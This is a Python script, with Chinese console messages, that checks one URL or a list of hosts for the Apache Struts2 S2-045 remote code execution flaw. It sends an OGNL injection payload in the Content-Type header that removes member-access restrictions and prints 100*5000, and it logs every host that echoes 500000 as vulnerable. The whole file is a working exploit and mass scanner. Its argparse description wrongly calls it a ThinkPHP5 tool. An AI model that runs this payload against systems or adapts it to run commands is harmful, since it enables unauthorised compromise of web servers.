import argparse
import textwrap

import requests


def main(url):
    full_url = f"{url}"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
               "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
               "Accept-Encoding": "gzip, deflate",
               "Content-Type": "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(100*5000)).(#ros.flush())}",
               "Connection": "close", "Upgrade-Insecure-Requests": "1", "Pragma": "no-cache",
               "Cache-Control": "no-cache"}
    try:
        response = requests.get(full_url, headers=headers, allow_redirects=False, verify=False,
                                timeout=5)
        print(response.text)
    except Exception:
        print(f"[-]{url}访问超时")
        return
    if "500000" in response.text:
        print(f'[+]{url}存在S2-45远程命令执行漏洞')
        return url
    else:
        print(f'[-]{url}不存在S2-45远程命令执行漏洞')


if __name__ == '__main__':
    banner = """ 
      _________________              _____ .________                               
     /   _____/\_____  \            /  |  ||   ____/         ______   ____   ____  
     \_____  \  /  ____/   ______  /   |  ||____  \   ______ \____ \ /  _ \_/ ___\ 
     /        \/       \  /_____/ /    ^   /       \ /_____/ |  |_> >  <_> )  \___ 
    /_______  /\_______ \         \____   /______  /         |   __/ \____/ \___  >
            \/         \/              |__|      \/          |__|               \/ 
    """
    print(banner)
    parser = argparse.ArgumentParser(description='thinkphp5 rce exp',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
            S2-45.py -u http://192.168.1.108 -f host.txt
            '''))
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.mhx.com:80")
    parser.add_argument("-f", "--file", dest="file", type=str, help="example: -f host.txt")
    parser.add_argument("-o", "--output", dest="output", type=str, help=" example: -o result.txt")
    args = parser.parse_args()
    if args.file:
        res_url = []
        with open(f"{args.file}", mode="r", encoding="u8") as f:
            for line in f:
                url = main(line.strip())
                if url:
                    res_url.append(url)
        with open("result1.txt", mode="w", encoding="u8") as f:
            for i in res_url:
                f.write(f"{i}存在S2-45远程命令执行漏洞\n")
    else:
        main(args.url)
